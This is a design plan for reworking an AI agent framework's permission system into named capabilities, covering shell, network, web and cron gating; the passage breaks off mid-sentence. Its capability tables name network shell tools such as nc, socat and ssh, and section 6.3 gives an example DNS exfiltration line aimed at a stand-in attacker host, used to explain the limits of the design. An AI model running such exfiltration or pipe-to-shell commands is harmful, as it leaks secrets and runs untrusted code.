# Permission system rework — plan

## Status
Planning only. Nothing here has been implemented. Every open question has
been answered; this is the plan of record, pending a final read.

---

## Problem statement

`users.User.permission_level` is a single int, 0-100. Every module that
needs a gate picks its own threshold on that one axis:

- `tool_handling/handler.py::register_tool(..., min_permission=25)` — a
  flat per-tool int, compared once in `execute_tool_call`
  (handler.py:459). **37 gated tools** across 11 modules, using 8 distinct
  threshold literals (0, 25, 30, 35, 40, 50, 75, 100) with no shared
  meaning between them.
- `modules/shell` bolts a *second*, much richer enforcement system on top:
  `policy.py` + `allow.yaml`/`deny.yaml` + `validate.py`, keyed by
  `applies_below: <level>` tiers. This exists because a single int cannot
  express "this caller may run `ls` but not `rm`" — that depends on the
  *argument*, not just who's calling.
- `modules/cron` adds `min_run_permission` / `min_create_permission` /
  `admin_override_permission`.
- `modules/sysops` adds `model_min_permission` (default 75) and enforces it
  **twice**, independently — once in the `/model` handler (sysops:216) and
  once inside `set_active_model` (sysops:472) — because a slash command is
  not a tool call and never passes through `execute_tool_call`.
- `modules/present` reads `agent.caller.permission_level` directly
  (present:55) and gates system-file delivery at `>= 40` (present:93) — a
  per-argument check, hand-rolled inside the tool.
- `modules/equipment_manifest` adds `trusted_threshold: 90`, which is not a
  gate at all but a *disclosure* flag.
- `bridges/discord/bridge.py` adds `dm_requires_permission: 75` and
  `reset_requires_permission: 75` — and `/shutdown` reuses `_can_reset`, so
  killing the gateway and resetting a session are the same gate today.
- `gateway/__main__.py` accepts `permission_level` in request bodies;
  `commands/launch.py` prompts to elevate to 100; `bridges/cli:465`
  hardcodes `permission_level: 100` on every message.

That's **five** hand-rolled enforcement sites outside `execute_tool_call`:
shell's policy engine, sysops ×2, present, the Discord bridge, and the
command registry's absence of any check at all. "permission_level 45" has
no fixed meaning, and any module needing per-argument nuance builds its own
gate.

**There is no network concept anywhere in the current model.** `curl`,
`wget`, `pip`, `ssh` appear in neither `allow.yaml` nor `deny.yaml`. They
are blocked below the tier cliff (the allow-list is stdin filters only) and
unrestricted above it. Network access today is a cliff, not a capability.

## Goals

1. Replace the single int with named boolean capabilities.
2. **One enforcement seam per entry point, and only two entry points** —
   `tool_handler.execute_tool_call` for tools, `CommandRegistry.dispatch`
   for slash commands. Tools needing per-argument nuance declare a
   *function* computing which bools a specific call needs.
3. Per-user overrides as a sparse diff against a named template.
4. Retire `modules/shell/policy.py` + `allow.yaml`/`deny.yaml` as a
   *parallel enforcement mechanism*.
5. **Fully retire `permission_level`** — gone, every reader migrated (§10).

## Non-goals

- Not building network-layer egress enforcement (§6.4).
- Not changing `UserStore`'s SQLite mechanics beyond §2's new columns.

---

## 1. Named permission bools

`TinyCTX/permissions.py` (pure data, mirrors `contracts.py`'s "no logic, no
I/O" rule). Convention is `RESOURCE_ACTION`.

```python
class Permission(str, Enum):
    # ---- Filesystem. Scope is set by location, not by the bool — §6.5.
    FILE_READ         = "file_read"
    FILE_WRITE        = "file_write"

    # ---- Network. Read vs write is by effect, not byte direction — §6.1.
    NETWORK_READ      = "network_read"
    NETWORK_WRITE     = "network_write"

    # ---- Execution and location.
    BACKEND_EXEC      = "backend_exec"       # run in the main container
    UNTRUSTED_EXEC    = "untrusted_exec"     # effects not classifiable

    # ---- Shaping the agent's working context: /reset, branch control,
    #      spawn_fork, nudge_fork, set_auto_rag_databanks.
    MANAGE_CTX        = "manage_ctx"
    MODEL_SWAP        = "model_swap"         # /model, set_active_model

    # ---- Memory.
    MEMORY_READ       = "memory_read"
    MEMORY_WRITE      = "memory_write"

    # ---- Scheduling. CRON_CREATE is checked on the caller at create time
    #      AND on the stored creator at run time — §8.
    CRON_CREATE       = "cron_create"
    CRON_ADMIN        = "cron_admin"         # act on others' jobs

    # ---- Reading user records. Mutating them is ROOT.
    USER_READ         = "user_read"          # user_list, user_info

    # ---- Total authority over the instance: edit anyone's permissions,
    #      rename or merge users, shut the gateway down, deliver protected
    #      system files. See §1.1.
    ROOT              = "root"

    # ---- Access and disclosure.
    DM_ACCESS         = "dm_access"          # may converse in DMs at all
    EQUIPMENT_TRUSTED = "equipment_trusted"  # disclosure, not a gate — §10.3

    # ---- Misc.
    IMAGE_GEN         = "image_gen"          # custom_modules/anima
```

Seventeen bools. `MANAGE_CTX` covers three things — clear the session,
spawn a concurrent fork, choose which databanks auto-inject — that share
one sentence: *change the shape of the agent's working context, as opposed
to reaching something outside it.* That a merged bool can be described in
one holdable sentence is the test for whether the merge was right.

### 1.1 `ROOT` is total

`ROOT` means "administer the instance itself": edit anyone's permissions,
rename or merge users, shut the gateway down, deliver protected system
files. It is deliberately a catch-all — the set of things that amount to
*being the operator* doesn't benefit from enumeration, because holding any
one of them gets you the rest. Splitting them would not buy an expressible
policy; nobody wants "may merge users but may not shut down".

Because `ROOT` is total by definition, `user_modify_permissions` needs no
"must not grant a bool the caller doesn't hold" ceiling — there is no
smaller admin bool that could escalate through it.

`USER_READ` stays separate: read-only `user_list` / `user_info` is
genuinely something you'd grant without instance authority.

In the enum docstring:

> `ROOT` and `BACKEND_EXEC + FILE_WRITE` are equivalent in ultimate power.
> Both let the holder rewrite `users.db` and grant themselves everything.
> Grant them together on any fully-elevated user; withholding one buys
> nothing.

### 1.2 Implication between bools

`NETWORK_WRITE` entails `NETWORK_READ` — every write-shaped request also
returns a response body, so it carries the inbound-content risk too. There
is no meaningful "may POST but not GET".

The filesystem pair is **not** symmetric, and the asymmetry must be stated
so nobody adds `FILE_WRITE → FILE_READ` for tidiness: `rm` deletes without
reading, `write_file` truncates without reading. (`edit_file` needs both —
that's the *tool* declaring two bools, not an implication between them.)

`ROOT` is deliberately **not** wired to imply the other 16. It is a
distinct capability, not the top of a lattice; making it imply everything
would resurrect the ladder this rework removes, and would make
`effective_permissions()` output misleading to read.

```python
# Implications are one level deep today; make expand() a fixpoint if that
# ever stops being true.
_IMPLIES: dict[Permission, frozenset[Permission]] = {
    Permission.NETWORK_WRITE: frozenset({Permission.NETWORK_READ}),
}

def expand(perms: Iterable[Permission]) -> frozenset[Permission]:
    out = set(perms)
    for p in list(out):
        out |= _IMPLIES.get(p, frozenset())
    return frozenset(out)
```

**Expansion applies to the requirement, never to the grant.** Expanding the
grant would let a `NETWORK_WRITE: true` override silently defeat an
explicit `NETWORK_READ: false` on the same user — the more specific
statement of intent would lose. Expanding the requirement keeps explicit
denials authoritative. So `expand()` is called on `needed`, never on
`effective`.

---

## 2. A single global template in config, per-user sparse diff in `users.db`

There is **one** permission template, not several. It lives in config as a
single flat mapping; per-user variation happens entirely through a sparse
diff stored on the user row.

Naming tiers is a false economy: most of what distinguishes one "role"
from another isn't a coherent bundle of capabilities, it's "this specific
person needs this specific bool" — and a handful of fixed tier names can't
express that without either overriding half the tier's grants (which
defeats naming it in the first place) or multiplying tier names without
end. One template makes this explicit: every user starts from the same
fully-explicit set, and every deviation is a line in that user's
`permission_overrides` — auditable by reading their row, not by
cross-referencing a tier name against a templates table.

```yaml
permissions:
  template:
    file_read: true
    network_read: true
    memory_read: true
    # everything unlisted is false; present/rag/skills are ungated
    # entirely and so appear nowhere
```

There is nothing to name and nothing to select between — `template` is a
flat mapping. `gateway.handle_user_create` and `commands/launch.py` have
nothing to pass at creation time as a result: every new user starts on
this one template with empty overrides.

`users` gains **one** column:

- `permission_overrides` (TEXT, JSON, default `'{}'`) — sparse dict
  `{permission_name: bool}`, storing only entries that *differ* from
  `permissions.template`.

There is no `permission_template` column. With one template there is
nothing per-user to select by name.

`User.effective_permissions()` = `permissions_config.template |
user.permission_overrides`, override wins.

"Elevate a user" means "give this one user overrides that make them
different from everyone else", not "assign them to a tier". The common
case, granting one user everything, is `{p.value: True for p in
Permission}` written to their overrides; `onboard/fix_permissions.py`'s
`elevate_user()`, the onboarding bootstrap step, and the gateway's `POST
/v1/user/{username}/elevate` endpoint all do exactly this (with a
`{"reset": true}` body / `--reset` flag as the inverse — clear the
overrides, fall back to the template). Fine-grained admin work — grant one
user `cron_admin` without touching anything else — is a single override
key, via `/user modify_permissions <username> <permission> <true|false>`
(slash command) or the `user_modify_permissions` tool, both ROOT-gated, no
ceiling to enforce (§1.1).

Unknown keys in the stored JSON (a permission since renamed or removed)
are dropped on read with a warning, never raised — a stale override must
not make a user unloadable.

`users/store.py`: `_DDL` has the one column, with the same
`PRAGMA table_info` + `ALTER TABLE ADD COLUMN` migration guard documented
in project memory for `cron_jobs.run_in` — `CREATE TABLE IF NOT EXISTS` is
a no-op against an existing table with an older column set. `_user_from_row`,
`update_user`, `create_user`, `_create_user` all thread
`permission_overrides` through, same pattern as `identities`/`meta`.

### 2.1 Backfilling existing users

An existing `users.db` can carry permission state in one of two other
shapes, depending on how old it is:

| existing shape | migration |
|---|---|
| `permission_level` INTEGER only | resolve via the range table below (`_LEGACY_TEMPLATES` / `_BACKFILL_RANGES` in `users/store.py`), then freeze the resolved set |
| `permission_template` TEXT + `permission_overrides` TEXT | resolve the stored template + overrides the same way `effective_permissions()` used to, then freeze that resolved set |

"Freeze the resolved set" means write a **full explicit**
`permission_overrides` dict — every `Permission` name present, `true` or
`false` — not a sparse diff against the single template. This isn't
optional: `UserStore` deliberately doesn't import `TinyCTX.config` (see
that module's docstring — the layering this avoids), so at migration time
there is no live `permissions.template` to diff against. Explicit-everything
is the only way to guarantee a migrated user's effective permissions don't
shift regardless of what `permissions.template` is set to. A freshly
created user still gets the normal sparse `{}` and resolves cleanly
against the template at read time.

The `permission_level` range table (migration-only — nothing else in this
codebase resolves permissions by these names):

| existing `permission_level` | resolves to |
|---|---|
| 0-24 | `guest`'s grants (empty) |
| 25-49 | `member`'s grants (file_read, network_read, memory_read) |
| 50-89 | `trusted`'s grants (see `_LEGACY_TEMPLATES` in `users/store.py`) |
| 90-100 | every `Permission` |

75 is worth eyeballing in that range — it lands in the `50-89` row rather
than `90-100`.

Both migration hops run as an `ALTER TABLE` + backfill + `DROP COLUMN`
guard, same pattern as `cron_jobs.run_in`, checked in the order a real
`users.db` could actually be in them (§11 step 3 in `users/store.py`).

---

## 3. `required_permissions` at tool registration

```python
def register_tool(
    self,
    func: Callable,
    name: str | None = None,
    description: str | None = None,
    always_on: bool = False,
    required_permissions: Callable[..., set[Permission]] | set[Permission] | None = None,
    listing_permissions: set[Permission] | None = None,   # §3.2
):
```

- A plain `set[Permission]` is static — wrapped as
  `lambda **_: required_permissions`.
- A callable receives the **same coerced kwargs** `execute_tool_call`
  already computes via `_coerce_args` (handler.py:484), and returns the set
  needed for *this* call's arguments. Invoked at the same point
  `min_permission` is checked today: exactly one enforcement call site.
- The callable must accept `**_`, so adding a tool parameter doesn't break
  its permission function with a `TypeError` at call time.
- **A raised exception inside `required_permissions` is a deny.** A
  classifier that crashes is the worst-case input by definition.
- `required_permissions=None` means *no capability required* — an ungated
  tool (`use_skill`, `rag_search`, `rag_list_databanks`, `list_cron`).
  Spelled explicitly rather than defaulted into, since a forgotten
  declaration and a deliberate ungated tool would otherwise look identical.
  §11 step 4 adds a startup assertion that every registered tool declares
  one or the other.

Enforcement in `execute_tool_call`, replacing handler.py:458-468:

```python
required_fn = self.tools[function_name].get('required_permissions')
if required_fn is not None:
    try:
        needed = permissions.expand(required_fn(**args))
    except Exception:
        logger.exception("permission classifier failed for %s", function_name)
        return {..., 'error': "[PERMISSION DENIED] could not classify call", 'success': False}
    effective = caller.effective_permissions()
    missing = {p for p in needed if not effective.get(p, False)}
    if missing:
        return {..., 'error': f"[PERMISSION DENIED] missing: {sorted(p.value for p in missing)}", 'success': False}
```

`args` here are the *coerced* args, computed a few lines below the current
check — so the coercion step moves above the permission check. Without that
reorder the callable sees `backend_access` as the string `"true"` and its
logic silently breaks on LLM-serialised args.

### 3.1 Config override path — warn and ignore

`config/__main__.py:120`'s per-tool `min_permission` override (applied at
handler.py:243-245) has nothing to act on once the int is gone, and doing
nothing would make it a **silent no-op** — an operator who hardened a tool
via config would quietly lose that hardening on upgrade.

`ToolOverride` keeps the field so old configs still parse, and the loader
emits one `logger.warning` per stale override naming the tool and pointing
at `permissions.template` (and per-user `permission_overrides`).

Not doing: a per-tool `required_permissions: [file_read, ...]` config list.
It works for static declarations but can't express an override for a
callable-based tool like `shell`, which is where an operator would most
want one — a half-feature. Revisit only if operators ask.

### 3.2 The tool-listing filter needs a static hint

handler.py:403 uses `min_permission` for a *second* purpose: in
`minimal_tokens` mode it hides tools the caller couldn't call, to save
prompt tokens. That filter is inherently static — it runs before any call
exists, so a dynamic callable has nothing to classify.

Rule: a tool with a **static** set filters on that set. A tool with a
**callable** filters on `listing_permissions` if declared, else is always
listed. For `shell`, `listing_permissions` is empty — any caller might run
*some* permitted command — matching today's behaviour at
`min_permission=30`.

Without an explicit rule, every migrated tool becomes either invisible or
always-visible depending on how the `.get('min_permission', 25)` default
happens to fall out.

---

## 4. Filesystem module (reference case: static sets)

```python
agent.tool_handler.register_tool(view, always_on=True,
    required_permissions={Permission.FILE_READ})
agent.tool_handler.register_tool(write_file, always_on=True,
    required_permissions={Permission.FILE_WRITE})
agent.tool_handler.register_tool(edit_file, always_on=True,
    required_permissions={Permission.FILE_READ, Permission.FILE_WRITE})
agent.tool_handler.register_tool(grep, always_on=True,
    required_permissions={Permission.FILE_READ})
agent.tool_handler.register_tool(glob_search, always_on=True,
    required_permissions={Permission.FILE_READ})
```

`edit_file` declares both bools where today it sits at 30, the same level
as `write_file`. Deliberate tightening: an edit reads existing content, so
a caller who may write but not read shouldn't launder a read through it.

The module's own `resolve()` containment (filesystem:204-224) is unchanged
and unaffected — §6.5 on why scope is not a permission concern.

---

## 5. Shell module

**What exists today:** parse the command as bash, resolve every subcommand
into a `Command(name, atoms, flags, operands, redirects, dynamic)`
(validate.py:87-116), then classify each against allow-posture rules
(`command`, `subcommand`, `allowed_flags`, `arg_matches`, `max_args`) or
deny-posture rules (`command`, `subcommand`, `any_flag`, `all_flags`,
`path_under`, `redirect_under`, ...), selected by which `ScopedPolicy` tier
the caller's `permission_level` falls under.

**Replacement — per-command capability tagging, compiled from data.** The
classification table itself lives in `modules/shell/perms.yaml` — a
declarative file, not Python — and `perms.py` compiles it once at import and
interprets it against the exact `Command` objects `validate._extract`
already produces. No new parsing; a data-driven lookup over existing output.

```python
def required_permissions_for_shell(command: str, timeout: int | None = None,
                                    backend_access: bool = False, **_) -> set[Permission]:
    commands = validate._extract(_parse(command))
    needed = set().union(*(classify(c) for c in commands)) if commands else set()
    if backend_access:
        needed.add(Permission.BACKEND_EXEC)
    return needed

def classify(cmd: Command) -> frozenset[Permission]:
    if cmd.name is None:
        return frozenset({Permission.UNTRUSTED_EXEC})
    spec = _table.by_name.get(cmd.name)
    base = _eval_spec(spec, cmd) if spec is not None else frozenset({Permission.UNTRUSTED_EXEC})
    if cmd.redirects:
        base = base | {Permission.FILE_WRITE}
    if cmd.dynamic:
        return base | _table.worst_case.get(cmd.name, frozenset()) | {Permission.UNTRUSTED_EXEC}
    return base
```

A `dynamic` command — one whose operands contain an expansion or unquoted
glob, so its values aren't knowable statically — is handled **additively**:
keep the name's tags, add the worst case that name could ever need, add
`UNTRUSTED_EXEC`. Not as a replacement. Replacing would make the dynamic
form demand *less* than the static one: a caller holding `UNTRUSTED_EXEC`
but denied `NETWORK_WRITE` could run `wget $URL` while being blocked from
`wget --post-data=x https://x` — the two forms must never trade the
guarantee the flag-based one already gave. (`curl` no longer illustrates
this split as cleanly as it used to: as of 2026-08-16 it carries
`NETWORK_WRITE` unconditionally — see §6.3.)

`perms.yaml` supports the same `extends:` / `disable:` / `builtin:<name>`
layering `allow.yaml` and `deny.yaml` already use, compiled independently
(perms.py doesn't share code with policy.py — different schema, same
posture). Loading happens once, at import time: a missing or malformed
`perms.yaml` is captured, never raised out of import, and every call to
`classify()`/`required_permissions_for_shell()` returns `{Permission.ROOT}`
until it's fixed — the same "must never degrade into an unrestricted shell"
posture §5.2's shape policy already uses.

### 5.1 The minimal tag table

Ship a deliberately short table and let everything else fall through to
`UNTRUSTED_EXEC`. Fail-closed, expandable one command at a time as real
usage justifies it.

**Pure computation — no bools at all** (redirects still add `FILE_WRITE`):

```
echo, printf, date, cal, expr, seq, factor, basename, dirname,
true, false, sleep, yes
```

These are exactly `allow.yaml`'s old low tier, and its closure argument
carries over unchanged: with no way to name a file, reach the network, or
read the environment, a pipeline of these can only transform text the
caller typed.

**Stdin filters — `FILE_READ` only when they name a file:**

```yaml
- id: filters-plain
  name: [cat, tr, rev, tac, uniq, head, tail, cut, paste, nl, grep, awk,
         cksum, md5sum, sha1sum, sha256sum]
  permissions: []
  if_operands: [file_read]
```

One entry covers sixteen commands, and it subsumes the `cat file` /
`cat > file` split without special-casing `cat` — the redirect-adds-
`FILE_WRITE` rule applies globally, to every command, not just filters. The
write-flag exceptions get their own small entries with a conditional `rules:`
list: `sort -o` / `shuf -o` / `sed -i` add `FILE_WRITE`; `wc --files0-from=F`
adds `FILE_READ`; `dd`'s `if=`/`of=` are matched by operand prefix rather
than by flag.

**Always touch the filesystem:**

| perms | commands |
|---|---|
| `FILE_READ` | `ls`, `find`, `stat`, `file`, `du`, `df`, `tree`, `readlink`, `realpath` |
| `FILE_WRITE` | `rm`, `rmdir`, `mkdir`, `touch`, `truncate`, `chmod`, `chown`, `tee` |
| `FILE_READ + FILE_WRITE` | `cp`, `mv`, `ln`, `install` |

**Network** — §6.3's marker table (`curl`, `wget`, `git`, `ping`, `dig`,
`nslookup`, `host`, `nc`, `ssh`), each expressed as a `permissions:` base
plus a handful of `rules:` (a flag present, or a flag present together with
a matching operand value — e.g. `curl -X POST` needs an operand-value check
alongside the flag check to tell it apart from `curl -X GET`).

**`scp`/`rsync`/`sftp` are deliberately unlisted.** Their real
classification is direction-dependent: uploading needs `FILE_READ +
NETWORK_WRITE`, downloading needs `NETWORK_READ + FILE_WRITE`, and telling
them apart means judging whether an operand's *shape* looks like a remote
`user@host:path` spec — not a condition the table's matcher primitives
(flag presence, operand membership, operand prefix, subcommand) can express.
Rather than carve out bespoke Python for just these three, they fall
through to the same `UNTRUSTED_EXEC` every other unrecognized command gets.
Precision is traded for keeping the whole table auditable as data; this can
be revisited if scp/rsync/sftp usage proves common enough to justify it.

**Everything else → `UNTRUSTED_EXEC`.** Including `python`, `node`, `sh`,
`bash`, `make`, `docker`, `systemctl`, `apt`, `pip`, `npm`, and every
command not named above.

The consequence to be conscious of: unless `permissions.template` (or a
specific user's `permission_overrides`) grants `UNTRUSTED_EXEC`, nobody can
run `python3 script.py`, even a user who otherwise holds everything else
short of `ROOT`/`BACKEND_EXEC`. That's the fail-closed posture working as
intended, but it *is* the most visible behaviour change in the whole
rework. Either grant `UNTRUSTED_EXEC` in the global template (or per-user),
or promote specific commands out of the catch-all as they prove needed —
the second is the point of starting minimal.

**Fail-closed reaches down to individual flags, too.** A *recognized*
command's base permissions cover its ordinary behaviour, not every flag it
could ever be called with — a flag that isn't declared safe via that
entry's `known_flags`, or matched by one of its `rules:` conditions, adds
`UNTRUSTED_EXEC` on top. `--help` is the one flag exempt everywhere;
nothing else is assumed harmless without being named. This is what stops
`find . -delete` from riding along on `find`'s bare `FILE_READ` tag — the
command is recognized, but `-delete` isn't one of the query/traversal flags
`perms.yaml` lists as known-safe for it, so it needs `UNTRUSTED_EXEC` like
any unclassified action would. The check deliberately does not try to
decompose a combined short-flag cluster (`ls -la`) into its constituent
letters the way `validate.py` builds `Command.atoms` — a single-dash
GNU-style "spelled out" option (`find`'s `-delete`, `-exec`, `-ok`)
decomposes into ordinary letters the same way a real cluster does, and
those letters are usually legitimately registered elsewhere on the same
entry for unrelated reasons; decomposing would silently wave the dangerous
flag through. `perms.yaml` lists the combined spellings it wants recognized
(`-la`, `-rf`, ...) explicitly instead.

### 5.2 Shape and construct validation stays

`allow.yaml` also constrains shape — `max_args: 0`, `arg_matches`,
`allowed_flags`, and the `constructs` map rejecting `$()`, globs,
redirection and control flow before rules are consulted. That last part is
what makes injection structurally impossible rather than filtered
(allow.yaml:76-80), and it is doing the actual anti-injection work — not
the part causing the two-systems complaint. The bool model answers "is
`FILE_READ` permitted at all", not "is this invocation shaped safely". The
two are complements.

Retired: `applies_below` posture selection, and the per-command allow/deny
rules standing in for capability declarations. Retained: `validate.py`'s
construct and shape checks, running underneath the bool gate.

---

## 6. The network axis

### 6.1 Read vs write is defined by effect, not byte direction

Every network call moves bytes both ways, so at the packet level the
distinction is meaningless. But that's the wrong referent — the same one
that would make `open(path, 'r')` a write, since a read mutates atime, the
page cache, and the open file table. Permission systems classify by
**effect on the protected asset**, not by mechanism.

Two referents that *are* asymmetric, and that agree in nearly every real
case: what crosses the boundary **inward** (remote bytes entering the
agent's context — prompt-injection surface), and what crosses **outward**
or **changes remotely** (local data leaving, durable state changing).

> **`NETWORK_READ`** — the call's purpose is to bring remote content in.
> **`NETWORK_WRITE`** — the call transmits local data outward, or causes a
> durable effect on the remote side.

The practical test is idempotence: *if this call succeeded and you replayed
it, would anything be different?* `GET`/`HEAD`: no. `POST`/`PUT`/`PATCH`/
`DELETE`: yes. That this lands exactly on HTTP's own safe-method split is
not a coincidence — HTTP made the distinction first, for the same reason.

This definition goes in `permissions.py`'s docstring verbatim. "But every
request is both" is the kind of objection that will be re-raised every six
months by whoever reads the enum next.

### 6.2 What the split buys

*May fetch documentation, may not upload my files.* That's `NETWORK_READ`
without `NETWORK_WRITE`, and it's the most common shape of "the agent can
look things up". Without the split it's unexpressible — you get network or
you don't, which is exactly today's cliff.

### 6.3 Classification markers for shell commands

Keyed off `Command.atoms` / `.flags` / `.operands` / `.subcommand`:

| command | marker | permissions |
|---|---|---|
| `curl` | any | `NETWORK_READ + NETWORK_WRITE` (unconditional as of 2026-08-16 — see note below) |
| `wget`, `http`, `httpie` | default | `NETWORK_READ` |
| `wget` | `--post-data`, `--post-file`, `--method=` non-GET | `+ NETWORK_WRITE` |
| `curl`, `wget` | `-o`/`-O`/`--output`, or a redirect target | `+ FILE_WRITE` |
| `git` | `clone`, `fetch`, `pull`, `ls-remote` | `NETWORK_READ` |
| `git` | `push` | `NETWORK_WRITE` (deny.yaml:291 blocks this today) |
| `scp`, `rsync`, `sftp` | any | not classified — falls to `UNTRUSTED_EXEC` (§5.1: direction detection isn't expressible in `perms.yaml`'s matcher primitives) |
| `ssh` | any | `NETWORK_WRITE + UNTRUSTED_EXEC` |
| `pip`, `npm`, `apt`, `cargo`, `gem` | `install`/`add` | `NETWORK_READ + FILE_WRITE + UNTRUSTED_EXEC` |
| `ping`, `dig`, `nslookup`, `host` | any | `NETWORK_READ` |
| `nc`, `netcat`, `socat` | any | `NETWORK_WRITE` |

Rows declaring `NETWORK_WRITE` don't also list `NETWORK_READ` — `expand()`
adds it (§1.2). Four deserve a note:

- **`curl` carries `NETWORK_WRITE` unconditionally, "for now, just to be
  safe."** Previously it followed the same flag-conditioned split `wget`
  still uses (default `NETWORK_READ`, `-d`/`-F`/`-X POST` etc. adding
  `NETWORK_WRITE`). That was judged too easy to route around — a body can
  ride out in ways the flag list doesn't anticipate, and even a bare `GET`'s
  URL/headers can carry data out (§6.4). Coarsening curl to always require
  both is a deliberate precaution, not a claim that every curl call is
  actually a write; `wget` keeps the finer-grained split for now.
- **`pip install` is an exec, not a fetch.** Install scripts run arbitrary
  code by design; tagging it `NETWORK_READ` alone would be a hole big
  enough to drive the model through. This is the general case of *inbound
  content that becomes executable*; `curl … | sh` is the same shape and is
  already caught, because the per-command model classifies `sh` separately.
- **`nc` is the case where "it's both" is literally true.** A raw socket is
  bidirectional by construction with no marker to read. It gets both bools
  — the model reporting honestly, not failing.
- **`dig` is an exfiltration channel** —
  `dig $(base64 secrets).attacker.com`. Tagged `NETWORK_READ` because
  that's what it is at the capability level; the exfil property is §6.4's
  subject and is not unique to `dig`.

### 6.4 What these bools do not buy

Classification is **best-effort intent labelling from observable markers.**
The server, not the flags, decides what a request does:
`wget 'https://api.example.com/delete?id=5'` is a `GET` with a destructive
effect and will be tagged `NETWORK_READ` alone — `wget` still follows the
flag-conditioned split (§6.3); `curl` no longer has a `NETWORK_READ`-only
form to make this same point with.

> `NETWORK_READ` without `NETWORK_WRITE` is a guardrail against accident and
> against a confused agent. It is **not** a boundary against a motivated
> exfiltrator. Anyone holding `NETWORK_READ` can move data out in a URL
> path, a query string, a DNS label, or request timing — this is exactly
> why `ping`, `dig`, and the rest of `network-read-cmds` stay `NETWORK_READ`
> only rather than getting the same unconditional `NETWORK_WRITE` bump curl
> just got: the exfil channel already exists at `NETWORK_READ`, so bumping
> read-only commands to also require `NETWORK_WRITE` wouldn't close
> anything — it would just make `NETWORK_READ` alone meaningless as a
> guardrail. `curl`'s bump is really about the *legitimate*, structured
> write path (POST/PUT/DATA) being one flag away, not about closing the
> covert-channel gap this paragraph describes.

A real egress boundary can only be enforced at the network layer — an
allow-listed egress proxy on the sandbox's compose network, exactly how LAN
isolation is already enforced (compose.yaml:165-185). Separate work, out of
scope; noted so the option stays visible rather than being quietly
foreclosed by shipping the bools and calling network access "solved".

### 6.5 `BACKEND_EXEC` is a location permission — and location sets scope

`backend_access=True` doesn't change what *kind* of call is allowed; it
changes **which container executes it**, and the container determines both
what the network reaches and what the filesystem contains:

| | agent container | sandbox container |
|---|---|---|
| workspace bind | `→ /home/tinyctx` | `→ /home/tinyctx` |
| **data bind** (`agent.db`, `users.db`, memory graph) | **`→ /etc/tinyctx`** | **absent** |
| `config.yaml` bind | present | absent |
| network | full, incl. LAN/Tailscale | outbound internet only, LAN-isolated |

The data directory is unreachable from the sandbox **by mount**, and
private addresses **by network topology** — neither is a policy check, and
neither can be bypassed by an application-level bug.
`config/__main__.py:356-357` states the intent directly: data is "separate
from workspace/ so the agent's own filesystem tools" cannot reach it.

This is why there is no `NETWORK_PRIVATE` bool and no `path_under: data/`
deny rule. Both would name a fact a second time, in a weaker place, and
could drift from the mount and network config that actually enforce it. A
deny rule would be worse than redundant: it would imply policy is what
protects `users.db`, when policy has never been what protects it.

Network bools compose with `BACKEND_EXEC` rather than being subsumed:

- `curl https://pypi.org` → `NETWORK_READ + NETWORK_WRITE` (curl's unconditional bump — §6.3)
- `curl http://192.168.1.5` → `NETWORK_READ + NETWORK_WRITE + BACKEND_EXEC`
- `wget https://pypi.org` → `NETWORK_READ` (still flag-conditioned)
- `wget http://192.168.1.5` → `NETWORK_READ + BACKEND_EXEC`

**`FILE_READ`/`FILE_WRITE` carry no scope — location does.** Under
`BACKEND_EXEC` those same bools reach `config.yaml` (API keys) and
`users.db` (the permission table itself), so `BACKEND_EXEC + FILE_WRITE` is
sufficient to grant yourself every other bool. That's why §1.1 says to
grant it alongside `ROOT` on any fully-elevated user. Not a flaw to fix —
it's what "run in the main container" means, and the mount topology is why
it's a narrow deliberate grant rather than an ambient one.

---

## 7. Web module

`_WEB_PERMISSIONS` (web:1280-1291) is a compact example of the problem:
`open_url` at 25 and `click` at 30, where the gap is meant to encode
"clicking can do more than looking" but says only "30 > 25".

| tool | today | becomes |
|---|---|---|
| `web_search`, `open_url`, `extract_text`, `extract_html`, `wait_for` | 25 | `NETWORK_READ` |
| `screenshot_browser` | 25 | `NETWORK_READ + FILE_WRITE` (writes an image, `_screenshot_path`) |
| `click`, `type_text` | 30 | `NETWORK_WRITE` |
| `manage_browser` | 40 | `NETWORK_WRITE` |

`click` and `type_text` are the interesting pair. A click on a nav link is
a read; a click on a submit button is a write; `type_text` puts
locally-originated data into a remote form. Which one it is depends on the
DOM, not the arguments — so unlike shell's `curl`, this is **not**
statically decidable, and it gets the conservative static answer. Same
"the server decides" limitation as §6.4, surfacing in a second place.

`_check_ssrf` / `_is_private_ip` (web:80-100) stay as they are. They
enforce destination scope in-process — needed because the browser runs in
the agent container — and are not replaced by any bool.

### 7.1 `present`, `use_skill`, `rag_search` — two ungated, one not

**`use_skill` and `collapse_skill_categories` → ungated.** `use_skill`
loads skill instructions into context; `collapse_skill_categories` changes
system-prompt display state. Neither *does* anything — the actions a skill
subsequently takes are individually gated at the tools it calls. The
principle: **a bool that gates a wrapper whose effects are already gated
downstream is double-counting, and the second count is the one that
drifts.**

**`rag_search` and `rag_list_databanks` → ungated.** `rag_search` returns
chunks from `workspace/rag/`, a subtree the operator populated specifically
so the agent would surface it in conversation — curated-for-disclosure by
construction, which is why it doesn't need `FILE_READ` despite technically
reading workspace files. This does assume databank contents are
non-sensitive; true by the nature of a lorebook, but it is an assumption
being made. `rag_list_databanks` returns names only. Only
`set_auto_rag_databanks` mutates context, and it takes `MANAGE_CTX`.

**`present` → `FILE_READ`, plus a dynamic `ROOT` escalation.** Not ungated,
for two reasons. It delivers workspace file *contents*, so an ungated
`present` would let a caller read any workspace file by asking the agent to
deliver it — that makes `FILE_READ` bypassable, a laundering path rather
than a redundant bool. And it already carries a hand-rolled per-argument
check: present:55 reads `agent.caller.permission_level`, and present:93
lets a **solo** call at `>= 40` bypass the blacklist and deliver system
files (`SOUL.md`, `AGENTS.md`, `TOOLS.md`, `memory/`).

So `present` is the third dynamic tool, alongside `shell` and nothing else:

```python
def _present_perms(media: list[str], **_) -> set[Permission]:
    needed = {Permission.FILE_READ}
    if len(media) == 1 and _is_system_file(_resolve(media[0]), ...):
        needed.add(Permission.ROOT)      # was: caller_level >= 40
    return needed
```

`ROOT` for the escalation because those files are the agent's own identity
and configuration — disclosing them is instance administration. The bool
disappears from the enum either way; what changes is that the level-40
check moves out of the module and into the seam.

---

## 8. Cron module

| today | becomes | checked on |
|---|---|---|
| `min_create_permission: 25` | `CRON_CREATE` | caller, at create time |
| `min_run_permission: 0` | `CRON_CREATE` | stored **creator**, at run time |
| `admin_override_permission: 90` | `CRON_ADMIN` | caller, to act on others' jobs |

One bool, checked in two places against two different people. A user who
loses `CRON_CREATE` has all their scheduled jobs **skipped wholesale**
rather than half-executing — a demoted creator's job doesn't run half its
